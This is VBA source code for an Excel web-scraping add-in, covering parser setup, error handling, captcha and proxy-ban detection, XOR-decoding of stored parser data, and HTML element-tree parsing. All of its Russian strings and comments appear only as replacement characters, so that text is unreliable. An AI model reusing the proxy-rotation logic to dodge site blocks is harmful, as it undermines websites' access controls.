    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ExcelVBA.ru
    On Error Resume Next
    DESCRIPTION_MODE = True: DESCRIPTION_MODE_FOR_ITEM = False: DescriptionText = ""
    Dim txt$, IsMask As Boolean
    
    DescriptionText = DescriptionText & "<div class=""parser-header""><div class=""parser-logo""><div class=""parser-caption"">" & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|</div><a href=""http://excelvba.ru/programmes/Parser"" target=""_blank"" title=""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"">" & _
        "<div class=""parser-additional-caption"">" & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd| 2014-2015 ExcelVBA.ru</div></a></div></div>" & vbNewLine        '& "<br />"
    
    PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "table-source-data", True
    
    DescriptionText = DescriptionText & "<h3>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| "
    
    With Me.SourceData
        Select Case .Mode
            Case ps_Column
                DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(.ColumnMode_Column) & _
                    IIf(.ColumnMode_SelectedRowsOnly, " (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "") & _
                    " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & .ColumnMode_FirstRow & "." & "</h3>"
                
                If .ColumnMode_CheckColumnEnabled And (.ColumnMode_CheckColumnNumber > 0) Then
                    IsMask = .ColumnMode_CheckColumnMask Like "*[#?*]*"
                    DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                        ColumnNameByColumnNumber(.ColumnMode_CheckColumnNumber) & " " & _
                        IIf(IsMask, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & .ColumnMode_CheckColumnMask, _
                        IIf(.ColumnMode_CheckColumnMask = "", "|fffd||fffd||fffd||fffd||fffd||fffd|.", "|fffd||fffd||fffd||fffd||fffd| " & .ColumnMode_CheckColumnMask)) & "</h3>"
                End If
                
            Case ps_FoundColumn
                Dim Find_Text$: Find_Text$ = Render(.FoundColumnMode_Find_Text)
                DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Find_Text$ & "|fffd|" & _
                    IIf(.FoundColumnMode_SelectedRowsOnly, " (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "") & _
                    " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & .FoundColumnMode_FirstRow & "." & "</h3>"
                
                If .FoundColumnMode_CheckColumnEnabled Then
                    IsMask = .FoundColumnMode_CheckColumnMask Like "*[#?*]*"
                    DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                        IIf(.FoundColumnMode_CheckColumnOffset, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & .FoundColumnMode_CheckColumnOffset, "") & " " & _
                        IIf(IsMask, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & .FoundColumnMode_CheckColumnMask, _
                        IIf(.FoundColumnMode_CheckColumnMask = "", "|fffd||fffd||fffd||fffd||fffd||fffd|.", "|fffd||fffd||fffd||fffd||fffd| " & .FoundColumnMode_CheckColumnMask)) & "</h3>"
                End If
                
            Case ps_NumericRange
                If .NumRangeMode_Step = 0 Then .NumRangeMode_Step = 1
                DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & .NumRangeMode_MinValue & " |fffd||fffd| " & .NumRangeMode_MaxValue & _
                    " |fffd| |fffd||fffd||fffd||fffd||fffd| " & .NumRangeMode_Step & "." & "</h3>"
                
            Case ps_FixedValue
                DescriptionText = DescriptionText & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Trim(.FixedValueMode_Value) & "</h3>"
                
            Case Else
                DescriptionText = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                Exit Function
        End Select
    End With
    
    Me.Run
    DESCRIPTION_MODE = False: DESCRIPTION_MODE_FOR_ITEM = False
    
    GetHTMLdescription = DescriptionText
End Function

Sub ReadOptionsFromINI()
    On Error Resume Next
    If Me.FileName = "" Then Exit Sub
    If Dir(Me.FileName, vbNormal) = "" Then Exit Sub
    
    Dim arr, ini_filename$, txt$, i&
    arr = Split(Me.FileName, "\")
    arr(UBound(arr)) = PARSER_INI_FILENAME$
    ini_filename$ = Join(arr, "\")
    If Dir(ini_filename$, vbNormal) = "" Then Exit Sub
    
    arr = "": arr = Split(FWF.ReadTXTfile(ini_filename$), vbNewLine)
    For i = LBound(arr) To UBound(arr)
        Select Case True
            Case arr(i) Like "var ?*=*"
                txt = Mid(arr(i), 5)
                ParserVariables.item(Split(txt, "=", 2)(0)) = Render(Split(txt, "=", 2)(1))
                'Debug.Print Split(txt, "=", 2)(0) & "=" & Split(txt, "=", 2)(1)
        End Select
    Next i
End Sub

Function SetError(ByVal ErrName$, errdescription$, Optional ErrURL$, _
        Optional InterruptAvailable As Boolean = False, Optional ByRef RetryCount& = 1000, Optional ByVal HelpURL$) As VbMsgBoxResult
    On Error Resume Next: SetError = vbIgnore        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Dim msg$, bmsg$, RetryMsg$, SU, MaxRetryCount&
    MaxRetryCount& = Me.Options.RetryCountOnError
    
    If RetryCount& < MaxRetryCount& Then
        RetryCount& = RetryCount& + 1
        SetError = vbRetry
        Exit Function
    End If
    If MaxRetryCount& Then RetryMsg$ = vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RetryCount& + 1 & ")"
    
    msg$ = ErrName$ & vbNewLine & Replace(errdescription$, "!URL", IIf(ErrURL$ Like "[A-Za-z]:\*", "file:///", "") & ErrURL$)
    'Debug.Print msg$ & RetryMsg$
    
    If Me.Options.ShowErrors Or TEST_ACTIONS_MODE Then
        bmsg$ = "<strong>" & ErrName$ & RetryMsg$ & "</strong><br />" & Replace(errdescription$, "!URL", CreateHTMLlink(ErrURL$))
        AddBalloon Replace(bmsg$, vbNewLine, "<br />"), bt_Attention, , HelpURL$
    End If
    
    If InterruptAvailable And Me.Options.InterruptOnError Then
        SU = Application.ScreenUpdating
        Application.ScreenUpdating = True
        SetError = MsgBox(Replace(msg$, vbNewLine, vbNewLine & vbNewLine), vbAbortRetryIgnore + vbExclamation + vbDefaultButton3, _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & RetryMsg$ & ": |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        'Application.ScreenUpdating = SU
    End If
End Function

Sub RunParserStart()
    On Error Resume Next
    StopMacro = False
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    
    Set RunningParser = Me
    ParserVariables.Add "{ParserName}", Me.Name
    Me.ReadOptionsFromINI
    Me.Variables.Initialize
    
    CreateNewInstanceOfWinHttpRequest Me
    Me.AASets.GetItemByName(ACTION_SET_NAME_BEFORESTART$).Execute
    Me.AASets.GetItemByName(ACTION_SET_NAME_ONSTART$).Execute
End Sub

Sub CreateTemporaryProgressIndicator()
    On Error Resume Next
    Set Me.PrInd1 = New ProgressIndicatorNew
    With Me.PrInd1
        .StatusBar = False
        .Temporary = True
        .Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
End Sub

Function CaptchaDetected(ByRef txt$) As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If StopCaptchaRequests Then Exit Function    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    If Me.Options.CaptchaEnabled And (Me.Options.CaptchaDetectionText <> "") Then
        If InStr(1, txt, Me.Options.CaptchaDetectionText, vbTextCompare) > 0 Then
            CaptchaDetected = True
        End If
    End If
End Function

Function BanDetected(ByRef txt$) As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    On Error Resume Next
    If Not Me.Proxy.Enabled Then Exit Function
    Dim DownloadStatus As Boolean
    DownloadStatus = Me.Proxy.PageContentOK(txt$)
    
    BanDetected = Not DownloadStatus
    Me.Proxy.UpdateActiveProxyInfo DownloadStatus
End Function

Function GetMainWorkbookPath() As String
    On Error Resume Next
    Dim FileName$
    FileName$ = Render(Me.Options.Workbook_Filename)
    If InStr(1, FileName$, ".") = 0 Then FileName$ = FileName$ & ".xlsx"
    If InStr(1, FileName$, ".xls") = 1 Then FileName$ = "noname" & FileName$
    GetMainWorkbookPath = GetFilenameAndCreatePathForFile(FileName$)
End Function

Function GetFirstLevelDescription() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim msg$, i&, txt$, arr, res$
    If Me.SourceData.Mode <> ps_FixedValue Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Function
    End If
    
    If Me.SourceData.FixedValueMode_SomeValues Then
        txt$ = txt$ & "<h3 class='parser-description parser-source-data'>|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</h3>" & vbNewLine
        txt$ = txt$ & "<p>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</p>" & vbNewLine
        txt$ = txt$ & CreateHTMLListFromArray(Split(Me.SourceData.FixedValueMode_Value, vbNewLine))
        GetFirstLevelDescription = txt: Exit Function
    End If
    
    StopMacro = False: Set GlobalError = Err: Me.StopRequested = False
    SHOW_PI2 = Me.Options.ShowPrInd2
    
    
    CreateNewInstanceOfWinHttpRequest Me
    Set RunningParser = Me
    
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    Set ParserVariables = New Dictionary: OLIM = 0
    ParserVariables.item("{ParserName}") = Me.Name
    If Me.Options.ClearDictionaries Then ClearDictionaries
    
    Me.ReadOptionsFromINI    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    Me.Variables.Initialize
    
    Me.AASets.GetItemByName(ACTION_SET_NAME_BEFORESTART$).Execute
    If Me.SourceData.InitializeAllItems <= O Then GoTo GetFirstLevelDescription
    
    If Me.Options.NeedsOpenedWorkbook Then GoTo GetFirstLevelDescription
    
    ParserVariables.item("{filename}") = Split(Me.Sheet.Parent.Name, ".xls")(0)
    ParserVariables.item("{sheetname}") = Me.Sheet.Name
    ParserVariables.Add "{addinfolder}", ThisWorkbook.Path & "\"
    If Me.Downloads.Enabled Then Me.Downloads.SaveFoldersInVariables
    
    Me.AASets.GetItemByName(ACTION_SET_NAME_ONSTART$).Execute
    
    Set Me.SourceData.Actions.SubActions = Nothing
    'Me.SourceData.Execute
    
    Dim ActiveItem As ParserSourceItem
    Set ActiveItem = Me.SourceData.Items(1)
    res$ = Me.SourceData.FixedValueMode_Value
    
    Me.SourceData.Actions.ApplyTo res$
    
    If res$ = "" Then
        MsgBox "|fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|.. " & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Function
    End If
    arr = Split(res$, ARSEP)
    
    For i = LBound(arr) To UBound(arr)
        If arr(i) Like "*<*>*</*>*" Then
            arr(i) = RealTrim(ConvertHTMLtoText(arr(i)))
        End If
        If arr(i) Like "http*|?*" Then
            arr(i) = Split(arr(i), "|")(1)
        End If
    Next i
    
    If Me.SourceData.FixedValueMode_SomeValues Then
        txt$ = txt$ & "<p>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</p>" & vbNewLine
    Else
        txt$ = txt$ & "<h3 class='parser-description parser-source-data'>|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & Me.Name & ", |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.</h3>" & vbNewLine
        txt$ = txt$ & "<p>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</p>" & vbNewLine
    End If
    
    txt$ = txt$ & CreateHTMLListFromArray(arr)
    GetFirstLevelDescription = txt
    
GetFirstLevelDescription:
    If Me.Options.ClearDictionaries Then ClearDictionaries
    
    'Set RunningParser = Nothing
    Err.Clear: Set GlobalError = Nothing
End Function

Sub UpdateWinHttpProxySettings()
    On Error Resume Next
    Me.Proxy.ActiveProxy.SetWinHttpProxySettings
End Sub

Attribute VB_Name = "WebsiteParsers"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : WebsiteParsers
' Author        : Igor Vakhnenko            Date: 13.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit
Option Compare Text

Public Items As New Collection

Private Sub Class_Terminate()
    Set Items = Nothing
End Sub

Function GetActiveParser() As WebsiteParser
    Dim ParserFilePath$, msg$
    On Error Resume Next
    If CURRENT_PARSER$ = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Function
    End If
    
    ParserFilePath$ = PARSERS_FOLDER$ & CURRENT_PARSER$ & PARSER_EXT$
    If Dir(ParserFilePath$, vbNormal) = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & CURRENT_PARSER$ & "|fffd|" & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & PARSERS_FOLDER$ & "|fffd|", vbCritical
        UpdateAddinToolbar
        Exit Function
    End If
    
    Set GetActiveParser = Me.AddFromXML(ParserFilePath$, False)
    msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & ParserFilePath$
    If GetActiveParser Is Nothing Then MsgBox msg$, vbExclamation, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
End Function

Function ParserExists(ByVal ParserName$) As Boolean
    On Error Resume Next: Dim ParserFilePath$
    ParserFilePath$ = PARSERS_FOLDER$ & ParserName$ & PARSER_EXT$
    ParserExists = Dir(ParserFilePath$, vbNormal) <> ""
End Function

Function GetParserByName(ByVal ParserName$) As WebsiteParser
    Dim WP As WebsiteParser, ParserFilePath$: On Error Resume Next
    If Not ParserExists(ParserName$) Then Exit Function
    
    ParserFilePath$ = PARSERS_FOLDER$ & ParserName$ & PARSER_EXT$
    Set GetParserByName = Me.AddFromXML(ParserFilePath$, True)
End Function

Function ListOfNames$()
    On Error Resume Next: Dim WPname, txt$
    For Each WPname In Items
        txt = txt & ", " & WPname
    Next WPname
    ListOfNames$ = Mid(txt, 3)
End Function

Function ToArray()
    On Error Resume Next
    Dim i&: ReDim arr(1 To Items.Count)
    For i = 1 To Items.Count
        arr(i) = Items(i)
    Next i
    ToArray = arr
End Function

Sub LoadAllFromFolder()
    On Error Resume Next
    Dim coll As Collection, FileName
    Set coll = FilenamesCollection(PARSERS_FOLDER$, "*" & PARSER_EXT$, 1)
    For Each FileName In coll
        'Items.Add LoadParserNameFromFile(filename)
        Items.Add Replace(Dir(FileName), PARSER_EXT$, ""), Replace(Dir(FileName), PARSER_EXT$, "")
    Next
End Sub

Function Add() As WebsiteParser
    On Error Resume Next
    CreatedParserFilename$ = ""
    F_ParserSettings_Add.Show
    If CreatedParserFilename$ = "" Then Exit Function
    
    Set Add = Me.AddFromXML(CreatedParserFilename$)
    UpdateAddinToolbar
End Function

Function AddFromXML(ByVal FileName$, Optional ByVal SilentMode As Boolean = True) As WebsiteParser
    Set AddFromXML = New WebsiteParser
    If Not AddFromXML.Load(FileName$, SilentMode) Then Set AddFromXML = Nothing
End Function

Function Count() As Long: Count = Me.Items.Count: End Function
    
Function GetFromSheet(ByRef sh As Worksheet) As WebsiteParser
    On Error Resume Next
    Dim txt$
    txt$ = ParserDisplay$(GetTextFromSheet(sh, PARSER_DATA_NAME$))
    If Not txt Like "*<Parser Name=*>*</Parser>*" Then Exit Function
    
    Set GetFromSheet = New WebsiteParser
    Set GetFromSheet.ParentSheet = sh
    GetFromSheet.BuildIn = True
    If Not GetFromSheet.Load(txt$, False) Then Set GetFromSheet = Nothing
End Function

Private Function ParserDisplay$(ByVal txt$)
    On Error Resume Next
    Dim d&, i&, letter$: d = Val("&H" & Mid(txt, 1, 2))
    For i = 2 To Len(txt) / 2
        letter = Val("&H" & Mid(txt, 2 * i - 1, 2))
        ParserDisplay$ = ParserDisplay$ & Chr(letter Xor CInt(2 * d * Abs(Sin(3 * (i - 1)))) + Val(Mid(PARSER_ENCRYPT_KEY$, 2 + (i - 1) Mod 10, 1)))
    Next
End Function

Function LoadParserNameFromFile(ByVal FileName$) As String
    On Error Resume Next: Err.Clear
    Dim XML As DOMDocument
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        .Load FileName$
        
        LoadParserNameFromFile = .SelectSingleNode("Parser").Attributes.getNamedItem("Name").text
        If LoadParserNameFromFile = "" Then LoadParserNameFromFile = Replace(Dir(FileName$), PARSER_EXT$, "")
    End With
    Set XML = Nothing
End Function

Attribute VB_Name = "XXX_SelectElement"
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 02.03.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Dim ElementsArrayIndex As Long, ElementsArray As Variant
Public ElementsTreeArray As Variant, ElementsTreeObjects As Collection

Function GetHTMLTreeObject(ByVal ind&) As Object
    On Error Resume Next
    Set GetHTMLTreeObject = ElementsTreeObjects.item(ind&)
End Function

Function GetActiveElementInfo(ByRef ActiveElement As MSHTML.IHTMLElement) As Boolean
    On Error Resume Next

    Dim ParentEl As MSHTML.IHTMLElement, i&, j&, arr, ind&
    Erase ElementsArray
    ReDim ElementsArray(1 To 32, 1 To 4)
    For i = LBound(ElementsArray) To UBound(ElementsArray): ElementsArray(i, 1) = 99: Next i
    Set ElementsTreeObjects = New Collection

    ElementsArrayIndex = 0: AddRowIntoElementsArray 0, ActiveElement

    ind& = 0: Set ParentEl = ActiveElement.parentElement
    Do While Not (ParentEl Is Nothing)
        If ParentEl.TagName = "body" Then Exit Do
        ind& = ind& - 1
        AddRowIntoElementsArray ind&, ParentEl
        Set ParentEl = ParentEl.parentElement
    Loop

    AddChildrenIntoArray "1.", ActiveElement
    SortElementsArray ElementsArray

    Erase ElementsTreeArray
    ReDim ElementsTreeArray(1 To ElementsArrayIndex, 1 To 4)
    For i = 1 To ElementsArrayIndex
        For j = 1 To 4
            ElementsTreeArray(i, j) = ElementsArray(i, j)
        Next
    Next

    AddSpacesIntoElementsTreeArray
    GetActiveElementInfo = ElementsArrayIndex > 0
End Function

Sub AddSpacesIntoElementsTreeArray()
    On Error Resume Next
    Dim SpacesCount&, i&, lvl As String, MinLevel&
    MinLevel& = ElementsTreeArray(1, 1)

    For i = 1 To ElementsArrayIndex
        SpacesCount& = 0: lvl = ElementsTreeArray(i, 1)
        Select Case Val(lvl)
            Case Is < 0: SpacesCount& = -MinLevel& + Val(lvl)
            Case Is >= 1: SpacesCount& = Len(lvl) - 2
        End Select
        If SpacesCount& Then ElementsTreeArray(i, 2) = Space(SpacesCount&) & ElementsTreeArray(i, 2)
    Next
End Sub
Sub AddChildrenIntoArray(ByVal PrevIndex$, ByRef EL As MSHTML.IHTMLElement)
    On Error Resume Next
    Dim ChildEl As MSHTML.IHTMLElement, i&, currIndex$
    If i > 3 Then Exit Sub

    For i = 0 To Application.min(EL.Children.Length - 1, 8)
        Set ChildEl = EL.Children.item(i)
        currIndex$ = PrevIndex$ & (i + 1)
        'Debug.Print CurrIndex$, ind, subind, i, ChildEl.TagName
        AddRowIntoElementsArray Val(Replace(currIndex$, ",", ".")), ChildEl
